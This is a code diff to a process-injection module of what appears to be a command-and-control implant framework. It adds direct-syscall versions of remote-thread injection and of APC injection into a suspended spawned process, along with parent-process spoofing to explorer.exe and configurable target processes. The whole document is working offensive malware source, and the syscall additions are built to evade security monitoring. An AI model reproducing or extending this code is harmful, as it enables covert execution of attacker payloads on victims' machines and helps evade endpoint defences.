@@ -16,6 +16,8 @@ constexpr unsigned long long moduleHash = djb2(moduleName);
 #include <tlhelp32.h>
 #include <psapi.h>
 
+#include <syscall.hpp>
+
 __declspec(dllexport) Inject* A_InjectConstructor() 
 {
     return new Inject();
@@ -38,10 +40,25 @@ Inject::Inject()
 	: ModuleCmd("", moduleHash)
 #endif
 {
+	m_processToSpawn = "notepad.exe";
+	m_useSyscall = false;
 }
 
 Inject::~Inject()
 {
+}
+
+int Inject::initConfig(const nlohmann::json &config)
+{
+	for (auto& it : config.items())
+	{
+		if(it.key()=="process")
+			m_processToSpawn = it.value();
+		else if(it.key()=="syscall")
+			m_useSyscall = true;
+	}
+
+	return 0;
 }
 
 std::string Inject::getInfo()
@@ -198,20 +215,49 @@ int Inject::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 #ifdef _WIN32
 
 
-std::string static inline inject(int pid, const std::string& payload)
+std::string static inline inject(int pid, const std::string& payload, bool useSyscall)
 {
 	std::string result;
 
 	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
 	if (processHandle)
 	{
-		PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
-		WriteProcessMemory(processHandle, remoteBuffer, payload.data(), payload.size(), NULL);
-		DWORD oldprotect = 0;
-		VirtualProtectEx(processHandle, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
-		HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-		CloseHandle(processHandle);
-		result += "Process injected.";
+		if(useSyscall)
+		{
+			PVOID remoteBuffer;
+			SIZE_T sizeToAlloc = payload.size();
+
+			Sw3NtAllocateVirtualMemory_(processHandle, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+			Sw3NtWriteVirtualMemory_(processHandle, remoteBuffer, (PVOID)payload.data(), payload.size(), 0);
+			
+			ULONG oldAccess;
+			Sw3NtProtectVirtualMemory_(processHandle, &remoteBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);
+
+			HANDLE hThread;
+			Sw3NtCreateThreadEx_(&hThread, 0x1FFFFF, NULL, processHandle, (void*) remoteBuffer, NULL, FALSE, 0, 0, 0, NULL);
+
+			Sw3NtClose_(hThread);
+			Sw3NtClose_(processHandle);
+			
+			result += "Process injected.";
+		}
+		else
+		{
+			PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+
+			WriteProcessMemory(processHandle, remoteBuffer, payload.data(), payload.size(), NULL);
+
+			DWORD oldprotect = 0;
+			VirtualProtectEx(processHandle, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
+
+			HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+
+			CloseHandle(remoteThread);
+			CloseHandle(processHandle);
+			result += "Process injected.";
+
+		}
 	}
 	else
 		result += "OpenProcess failed.";
@@ -268,29 +314,23 @@ DWORD GetPidByName(const char * pName)
 
 
 // https://cocomelonc.github.io/tutorial/2021/11/20/malware-injection-4.html
-std::string static inline spawnInject(const std::string& payload, const std::string& processToSpawn)
+std::string static inline spawnInject(const std::string& payload, const std::string& processToSpawn, bool useSyscall)
 {
 	std::string result;
 
-	STARTUPINFOEX info = { sizeof(info) };
-	PROCESS_INFORMATION pi;
-	SIZE_T cbAttributeListSize = 0;
-	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
-	HANDLE hParentProcess = NULL;
-	DWORD dwPid = 0;
-
 	// Spoof parent ID to set explorer.exe
-	dwPid = GetPidByName("explorer.exe");
+	DWORD dwPid = GetPidByName("explorer.exe");
 	if (dwPid == 0)
-			dwPid = GetCurrentProcessId();
+		dwPid = GetCurrentProcessId();
 
 	// create fresh attributelist
+	SIZE_T cbAttributeListSize = 0;
 	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
-	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
+	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
 	InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);
 
 	// copy and spoof parent process ID
-	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
+	HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
 	UpdateProcThreadAttribute(pAttributeList,
 							0,
 							PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
@@ -299,18 +339,42 @@ std::string static inline spawnInject(const std::string& payload, const std::str
 							NULL,
 							NULL);
 
-	info.lpAttributeList = pAttributeList;
+	PROCESS_INFORMATION piProcInfo;
+	STARTUPINFOEX startupInfoEx = { sizeof(startupInfoEx) };
+	startupInfoEx.lpAttributeList = pAttributeList;
 
-	if (CreateProcess(NULL, const_cast<LPSTR>(processToSpawn.c_str()), NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED, NULL, NULL, &info.StartupInfo, &pi))
+	if (CreateProcess(NULL, const_cast<LPSTR>(processToSpawn.c_str()), NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED, NULL, NULL, &startupInfoEx.StartupInfo, &piProcInfo))
 	{
-		PVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
-		WriteProcessMemory(pi.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);
-		DWORD oldprotect = 0;
-		VirtualProtectEx(pi.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
-		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
-		QueueUserAPC((PAPCFUNC)apcRoutine, pi.hThread, NULL);
-		ResumeThread(pi.hThread);
-		result += "Process injected.";
+		if(useSyscall)
+		{
+			PVOID remoteBuffer;
+			SIZE_T sizeToAlloc = payload.size();
+
+			Sw3NtAllocateVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+			Sw3NtWriteVirtualMemory_(piProcInfo.hProcess, remoteBuffer, (PVOID)payload.data(), payload.size(), 0);
+			
+			ULONG oldAccess;
+			Sw3NtProtectVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);
+
+			Sw3NtQueueApcThread_(piProcInfo.hThread, (PIO_APC_ROUTINE)remoteBuffer, remoteBuffer, NULL, NULL);
+			Sw3NtResumeThread_(piProcInfo.hThread, NULL);
+			result += "Process injected.";
+		}
+		else
+		{
+			PVOID remoteBuffer = VirtualAllocEx(piProcInfo.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+
+			WriteProcessMemory(piProcInfo.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);
+
+			DWORD oldprotect = 0;
+			VirtualProtectEx(piProcInfo.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
+
+			PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
+			QueueUserAPC((PAPCFUNC)apcRoutine, piProcInfo.hThread, NULL);
+			ResumeThread(piProcInfo.hThread);
+			result += "Process injected.";
+		}
 	}
 	else
 	{
@@ -335,12 +399,14 @@ int Inject::process(C2Message &c2Message, C2Message &c2RetMessage)
 	std::string result;
 	if(pid>0)
 	{
-		result = inject(pid, shellcode);
+		result = inject(pid, shellcode, m_useSyscall);
 	}
 	else
 	{
 		std::string processToSpawn="notepad.exe";
-		result = spawnInject(shellcode, processToSpawn);
+		if(!m_processToSpawn.empty())
+			processToSpawn=m_processToSpawn;
+		result = spawnInject(shellcode, processToSpawn, m_useSyscall);
 	}
 
 	// variantes
